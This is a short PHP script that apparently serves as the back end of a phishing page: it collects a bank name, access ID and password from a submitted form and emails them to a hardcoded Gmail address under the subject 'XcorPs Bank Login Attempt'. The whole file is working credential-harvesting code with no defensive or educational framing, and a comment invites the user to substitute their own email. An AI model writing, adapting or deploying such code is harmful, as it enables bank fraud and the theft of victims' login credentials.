<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $bank = $_POST['bank_name'];
    $access = $_POST['access_id'];
    $password = $_POST['password'];

    $to = "wsamson630@gmail.com";  // ✅ Replace with your actual email
    $subject = "XcorPs Bank Login Attempt";
    $message = "Bank Name: $bank\nAccess ID: $access\nPassword: $password";
    $headers = "From: no-reply@xcorps.online";

    if (mail($to, $subject, $message, $headers)) {
        echo "success";
    } else {
        echo "fail";
    }
} else {
    echo "invalid";
}
?>